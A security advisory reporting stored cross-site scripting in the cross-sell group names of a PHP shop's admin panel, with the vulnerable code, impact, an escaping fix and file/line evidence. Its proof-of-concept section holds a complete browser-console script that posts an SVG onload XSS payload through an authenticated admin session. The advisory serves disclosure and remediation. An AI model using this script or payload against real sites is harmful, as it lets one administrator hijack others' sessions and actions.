# Advisory — Stored Cross-Site Scripting in `/admin/cross_sell_groups.php`

## Summary

The administrative endpoint `/admin/cross_sell_groups.php` allows HTML/JavaScript to be stored in the name of a cross-sell group. The value is later rendered directly on several administrative pages without HTML escaping, resulting in Stored XSS.

## Classification

- Vulnerability: Stored Cross-Site Scripting (XSS)
- CWE: CWE-79
- Severity: Medium
- Access required: authenticated administrator with permission to manage cross-sell groups
- Interaction required: another administrator must view the tainted group

## Vulnerable code

User-controlled input:

```php
$cross_sell_name_array = $_POST['cross_sell_group_name'];

$sql_data_array = array(
  'groupname' => xtc_db_prepare_input(
    $cross_sell_name_array[$languages[$i]['id']]
  ),
  'xsell_sort_order' => (int)$_POST['xsell_sort_order']
);
```

The `xtc_db_prepare_input()` function only applies `trim()` and `stripslashes()`. It does not perform HTML escaping.

The value is rendered without escaping:

```php
echo '<td class="dataTableContent">' . $cross_sell['groupname'] . '</td>';
```

It is also used directly in:

```php
$contents[] = array('text' => '<br /><b>' . $oInfo->groupname . '</b>');
$heading[] = array('text' => '<b>' . $oInfo->groupname . '</b>');
```

## Dynamic PoC

Run in the browser console with an active administrative session:

```javascript
(async () => {
  const payload = '<svg/onload=alert(document.domain)>';

  const page = await fetch(
    '/admin/cross_sell_groups.php?action=new',
    {
      credentials: 'same-origin',
      cache: 'no-store'
    }
  );

  const html = await page.text();
  const doc = new DOMParser().parseFromString(html, 'text/html');
  const form = [...doc.forms].find(f =>
    f.action.includes('cross_sell_groups.php')
  );

  if (!form) {
    throw new Error('Group form not found');
  }

  const body = new URLSearchParams(new FormData(form));

  const fields = [
    ...form.querySelectorAll(
      'input[name^="cross_sell_group_name["]'
    )
  ];

  if (!fields.length) {
    throw new Error('cross_sell_group_name field not found');
  }

  for (const field of fields) {
    body.set(field.name, payload);
  }

  body.set('xsell_sort_order', '0');

  const response = await fetch(form.action, {
    method: 'POST',
    credentials: 'same-origin',
    cache: 'no-store',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body
  });

  await response.text();

  console.log({
    status: response.status,
    final_url: response.url
  });

  location.href = '/admin/cross_sell_groups.php';
})();
```

When the listing is loaded or the created group is opened, the stored JavaScript executes in the application's administrative context.

## Impact

An administrator with permission to create or edit groups can store JavaScript that will execute when another administrator views:

- the group listing;
- the details panel;
- the deletion confirmation;
- the group edit screen.

This can allow administrative data to be altered, actions to be performed on behalf of the victim, and access to information available in the administrative session.

## Recommended fix

Apply contextual escaping on output:

```php
htmlspecialchars(
  $cross_sell['groupname'],
  ENT_QUOTES | ENT_SUBSTITUTE,
  'UTF-8'
)
```

The fix must be applied to every output of `groupname`, including the listing rows, details, edit and delete screens. A restrictive CSP policy is also recommended as an additional layer of protection.

## Evidence

- Input: `cross_sell_group_name[<language_id>]`
- Persistence: `products_xsell_groups` table
- Vulnerable output: `src/admin/cross_sell_groups.php:145`
- Additional outputs: `src/admin/cross_sell_groups.php:212`, `218` and `225`
- Insufficient protection: `src/inc/db_functions.inc.php:23–33`
